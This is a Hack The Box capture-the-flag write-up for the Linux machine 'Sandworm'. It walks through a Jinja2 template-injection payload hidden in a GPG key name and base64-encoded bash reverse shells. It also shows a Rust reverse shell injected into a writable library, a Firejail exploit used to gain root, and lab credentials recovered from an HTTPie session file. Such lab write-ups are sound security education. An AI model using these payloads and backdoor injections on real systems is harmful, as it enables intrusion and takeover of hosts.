# HTB Machine Writeup: Sandworm
### By: gnos1s

### Machine Difficulty: Medium
### Machine Release Date: 18 June 2023
### Operating System: Linux

## Enumeration

As always, we start off with our trusty Nmap scan:

```
$ nmap -sC -sV -p- -oA nmap 10.10.11.218
# Nmap 7.92 scan initiated Tue Jul 25 09:50:46 2023 as: nmap -sC -sV -oA nmap 10.10.11.218
Nmap scan report for 10.10.11.218
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 25 09:51:54 2023 -- 1 IP address (1 host up) scanned in 67.62 seconds
```

We see ports 22, 80, and 443 open. This looks like a standard webservice. Port 80 seems to redirect to https://ssa.htb/, meaning the site is enforcing https.

Let's add that to our host file:
```
> echo '10.10.11.218    ssa.htb' >> /etc/hosts
```

Now we can visit the website, which seems to be a security agency:

![Homepage of website](website_homepage.png)

At the bottom of the page, we can see that the website is running Flask. This could be useful for later:

![Reveal of Flask framework](flask.png)

Upon clicking the Contact button, we get a form. However, the more interesting thing is a link to the "Guide":

![Contact page](contact_page.png)

The guide button redirects us to /guide. There's a lot we can do here. We can encrypt, decrypt, and verify PGP messages.

![Guide page](guide_page.png)

There's a small button that leads to a demo PGP public key that we can use. Let's test this application out.
First, we grab the site-provided public key and paste it into the Encrypt Message field. Next, we copy the result and try decrypting the message.

The message successfully decrypted, meaning this page has real functionality.

![Webapp working](working.png)

We now move our attention to the Verify Signature section. The site asks for our public key and encrypted message, meaning we'll have to use a PGP encryption tool to do this ourselves.

I'll be using the GPG command line tool for this since I know it best.
We first create a PGP keypair:

```
$ gpg --gen-key
gpg (GnuPG) 2.4.3; Copyright (C) 2023 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: gno s1s
Email address: test@test.com
You selected this USER-ID:
    "gno s1s <test@test.com>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/Users/ethanwang/.gnupg/openpgp-revocs.d/F8C5F33D7BA309C9FEDDCBB421FAEAB74AD428E7.rev'
public and secret key created and signed.

pub   ed25519 2023-08-03 [SC] [expires: 2026-08-02]
      F8C5F33D7BA309C9FEDDCBB421FAEAB74AD428E7
uid                      gno s1s <test@test.com>
sub   cv25519 2023-08-03 [E] [expires: 2026-08-02]
```

We then need to encrypt a message with our new key. First, we create a test message:

```
$ echo "This is a test." > message.txt
```

We also need our PGP public key, so we get that using the --export command:

```
$ gpg --output ./publickey --export --armor test@test.com
File './message' exists. Overwrite? (y/N) y
$ cat publickey
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEZMuwkhYJKwYBBAHaRw8BAQdAMSdNo7XFj4A6QeUoffy9KI1j7ZRKQdrbairy
MZ6hXjq0F2dubyBzMXMgPHRlc3RAdGVzdC5jb20+iJkEExYKAEEWIQT4xfM9e6MJ
yf7dy7Qh+uq3StQo5wUCZMuwkgIbAwUJBaOagAULCQgHAgIiAgYVCgkICwIEFgID
AQIeBwIXgAAKCRAh+uq3StQo50ZiAP9W3ql77BiOV/WRhUqCDy1Mmmawc9ZM6/7E
fpVLcQH40AEAh3sJPedlvDm22HmXt1e6oKm40FwaWrRgNTnLBhJwwAq4OARky7CS
EgorBgEEAZdVAQUBAQdAXeY7J8JeO9e9PKS1rzZs8P0bUE71duGKo7ecwOpyTV0D
AQgHiH4EGBYKACYWIQT4xfM9e6MJyf7dy7Qh+uq3StQo5wUCZMuwkgIbDAUJBaOa
gAAKCRAh+uq3StQo51gNAQDefLkk/vYirRhqpdcbdEKyL7C1JTHbDWZj4CC4ADOh
5gD9FxTYEqPGD1Usk0N2PMijX5EogdbG/rwVHyDH/asE2wo=
=qCii
-----END PGP PUBLIC KEY BLOCK-----
```

We then encrypt the message using gpg:

```
$ gpg --armor --clear-sign --default-key F8C5F33D7BA309C9FEDDCBB421FAEAB74AD428E7  message.txt
gpg: using "F8C5F33D7BA309C9FEDDCBB421FAEAB74AD428E7" as default secret key for signing
File 'message.txt.asc' exists. Overwrite? (y/N) y
$ cat message.txt.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

This is a test.
-----BEGIN PGP SIGNATURE-----

iHUEARYKAB0WIQT4xfM9e6MJyf7dy7Qh+uq3StQo5wUCZMxyGwAKCRAh+uq3StQo
51E3AQDscEOGrl5tURJafy6q9qWNLvdxUAh3wMyozxqD4R1dpwD/fK4ReSNiPzml
eByXGmVQWub7bBZ2vPN0YCVuRPfSrwc=
=8y25
-----END PGP SIGNATURE-----
```

Now, we can submit our public key and message to the server.

![First submit data](first_verify.png) ![First result](first_verify_result.png)

The signature verification is working! We see a lot of output but the site says that the signature is valid.

## Diving Deeper

There are lots of different exploits we could try here, but let's try to be as simple as possible. When we verify the signature, the output contains the real name that we used when creating the key. Since this field is returned back to us, could we try to exploit it?

Since the site is running Flask, there is a good chance at a SSTI vulnerability. Let's try with the payload {7*7} and see what happens:

```
$ gpg --gen-key
gpg (GnuPG) 2.4.3; Copyright (C) 2023 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {7*7}
Email address: gno@s1s.com
You selected this USER-ID:
    "{7*7} <gno@s1s.com>"

<snip>

$ gpg --armor --clear-sign --default-key 82035843FE19BF602210BCC024DB9C048AB31978 message.txt
gpg: using "82035843FE19BF602210BCC024DB9C048AB31978" as default secret key for signing
File 'message.txt.asc' exists. Overwrite? (y/N) y

```

{7\*7} doesn't seem to work, but {{7\*7}} does. The result of {{7\*7}} gets calculated. The application is injectable!

![{7*7}]({7*7}.png) ![{{7*7}}]({{7*7}}.png)

Next, we have to confirm what framework that app is using. We can do this using the {{7\*'7'}} payload.

![SSTI Tree Diagram](ssti.webp) ![{{7*'7'}}]({{7*'7'}}.png)

The payload 7*'7' gives the result 7777777. According to the diagram, this means we're dealing with a Jinja2 or Twig app.

Let's try some Jinja2 payloads. [Source](https://gist.github.com/Yuma-Tsushima07/cc6bf0d5f356dc6cd4b8ea2baf6fa4e2) First of all, we dump all classes using the payload {{ "".__class__.__mro__[1].__subclasses__() }}:

![popen_none](popen_none.png)

We get all the classes! We can confirm that the site is running on the Jinja2 framework.
Our next step is to locate the position of the Popen function, since that function allows remote code execution. We can do this by making the range of the subclasses array smaller and smalle to search for the Popen function. Here are the payloads I used:

```
{{ "".__class__.__mro__[1].__subclasses__()[300] }}
{{ "".__class__.__mro__[1].__subclasses__()[500] }}
{{ "".__class__.__mro__[1].__subclasses__()[400] }}
{{ "".__class__.__mro__[1].__subclasses__()[435] }}
```

We get closer and closer to the Popen function. Eventually, I found that Popen was at position 439. Now, we can try remote code execution:

```
{{ "".__class__.__mro__[1].__subclasses__()[439] ('ls',shell=True,stdout=-1).communicate() }}
```

![popen_ls](popen_ls.png)

And it worked! The b'SSA\n' means that there's one file/directory called SSA. We can now execute commands on the machine. Let's try to get a reverse shell:

```
$ gpg --gen-key
gpg (GnuPG) 2.4.3; Copyright (C) 2023 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {{ "".__class__.__mro__[1].__subclasses__()[439] ('bash -i >& /dev/tcp/10.10.14.18/9001 0>&1',shell=True,stdout=-1).communicate() }}
Invalid character in name
The characters '<' and '>' may not appear in name
Real name:
```

It turns out we can't put < and > characters in the gpg real name. This means our direct Bash shell won't work. let's try encoding it using base64:

```
$ echo "bash -i >& /dev/tcp/10.10.14.18/9001 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEK
$ gpg --gen-key
gpg (GnuPG) 2.4.3; Copyright (C) 2023 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {{ "".__class__.__mro__[1].__subclasses__()[439] ('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEK" | base64 -d | bash',shell=True,stdout=-1).communicate() }}
Email address:
```

This time it worked. We now start our netcat listener:

```
$ nc -lvnp 9001
```

And we execute the payload. We got our shell as atlas!

```
Listening on 10.10.14.18 9001 (etlservicemgr)
Connection from 10.10.11.218:50226
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$
```

## User Flag

After poking around for a bit, we find that some build-in commands simply don't run. For example, uname:

```
atlas@sandworm:/var/www/html/SSA$ uname
uname
Could not find command-not-found database. Run 'sudo apt update' to populate it.
uname: command not found
atlas@sandworm:/var/www/html/SSA$
```

This is unusual. Maybe we're inside of some restricted shell environment.
In our home directory, we find a directory called .config. Looking inside, there's a directory called firejail. After doing some reearch we find that firejail is a SUID sandbox program. (Or, a restricted shell tool). We're probably in a Firejail right now.

We can't enter the Firejail directory (Permission denied), but we can enter another directory in the same folder called httpie.

We find credentials in a file inside the httpie directory!

```
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
cat admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$
```

Let's try logging in via SSH. It works!

```
$ ssh silentobserver@10.10.11.218
silentobserver@10.10.11.218's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com

<snip>

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug  5 09:42:35 2023 from 10.10.16.29
silentobserver@sandworm:~$
```

And we can find the user flag here.

## Pivoting to atlas

Poking around, we find two interesting directories called crates and tipnet:

```
silentobserver@sandworm:/opt$ ls
crates  tipnet
```

We don't know what these are there for though. 
Browsing both directories, we find a file called lib.rs in crates that we have write access to.

```
silentobserver@sandworm:/opt/crates/logger/src$ ls -al
total 12
drwxrwxr-x 2 atlas silentobserver 4096 May  4 17:12 .
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 ..
-rw-rw-r-- 1 atlas silentobserver  732 May  4 17:12 lib.rs
```

We can write a shell to this Main.rs, but we still don't know how and when it gets executed. Let's run pspy.

```
2023/08/05 12:59:39 CMD: UID=1000  PID=562604 | target/debug/tipnet
```

We can see a command called Tipnet getting ran, and it may have used that lib.rs file we can write to.
Let's add some random shit into lib.rs and see if the file gets changed. We can see if the command has ran the file this way.

```
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs
extern crate chrono;
wiefoiwefowefoweoifewiogioweiogwoiehghiwhievwnenwennnn <--- stuff i added
use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

We wait a few minutes and it's gone. Whaaat?

```
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs
cat: lib.rs: No such file or directory
```

A few minutes later the file is back. At least we know that the file is getting edited in some way. Let's try to add a Rust reverse shell. Here is the payload I added:

```
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let output = Command::new("bash")
.arg("-c")
.arg("bash -i >& /dev/tcp/10.10.14.163/4444 0>&1")
.output()
.expect("failed to execute process")
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

We now have to recompile the Rust code using cargo build:

```
silentobserver@sandworm:/opt/crates/logger/src$ cargo build
   Compiling autocfg v1.1.0
   Compiling libc v0.2.142
   Compiling num-traits v0.2.15
   Compiling num-integer v0.1.45
   Compiling time v0.1.45
   Compiling iana-time-zone v0.1.56
   Compiling chrono v0.4.24
   Compiling logger v0.1.0 (/opt/crates/logger)
error: expected `;`, found keyword `let`
  --> src/lib.rs:12:37
   |
12 | .expect("failed to execute process")
   |                                     ^ help: add `;` here
13 |     let now = Local::now();
   |     --- unexpected token

error: could not compile `logger` due to previous error
warning: build failed, waiting for other jobs to finish...
```

I forgot a semicolon! god dammit. I quickly fix the mistake:

```
silentobserver@sandworm:/opt/crates/logger/src$ vi lib.rs
silentobserver@sandworm:/opt/crates/logger/src$ cargo build
   Compiling logger v0.1.0 (/opt/crates/logger)
warning: unused variable: `output`
 --> src/lib.rs:8:9
  |
8 |     let output = Command::new("bash")
  |         ^^^^^^ help: if this is intentional, prefix it with an underscore: `_output`
  |
  = note: `#[warn(unused_variables)]` on by default

warning: `logger` (lib) generated 1 warning
    Finished dev [unoptimized + debuginfo] target(s) in 0.49s
silentobserver@sandworm:/opt/crates/logger/src$

```

And the file successfully compiled. Seconds later, we get a reverse shell! We have the shell as the atlas user (as we expected since the lib.rs file is owned by atlas), but now we're no longer in a jail, meaning this is progress.

```
Listening on 10.10.14.18 4444 (krb524)
Connection from 10.10.11.218:41810
bash: cannot set terminal process group (700939): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$
```

## Final Privesc

After some basic enumeration, we find that we are in the 'jailer' group. We weren't in this group before...

```
atlas@sandworm:/opt/tipnet$ groups
groups
atlas jailer
```

We find that we can run /usr/bin/firejail as root! The executable has the SUID bit set.

```
atlas@sandworm:/opt/tipnet$ find / -perm -4000 -user root 2>/dev/null
find / -perm -4000 -user root 2>/dev/null
/usr/local/bin/firejail
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
```

We just have to use Firejail to privesc now. I find [This](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25).

We open up another shell as atlas by adding our public key into the authorized_keys file.

Now, we transfer the exploit python script to the machine and run it:

```
atlas@sandworm:~$ python3 exploit.py
You can now run 'firejail --join=701433' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

Now, we just do what the exploit says and we have a root shell!

```
atlas@sandworm:~$ firejail --join=701433
changing root to /proc/701433/root
Warning: cleaning all supplementary groups
Child process initialized in 8.61 ms
atlas@sandworm:~$ su -
root@sandworm:~# whoami
root
```

And we can read the root flag.

I found this a pretty cool and solid medium machine. It was quite frustrating when I first pwned it, but it really taught me a lot about PGP keys and PGP encryption. I also familiarized myself with the gpg tool, a very powerful tool that I will definitely put into use on my future journeys. The privilege escalation was also really cool. It did involve some guessing with the lib.rs file, but I think that more than enough hints are given to guide you onto the right path. Hope you enjoyed this writeup, and have a good one! :D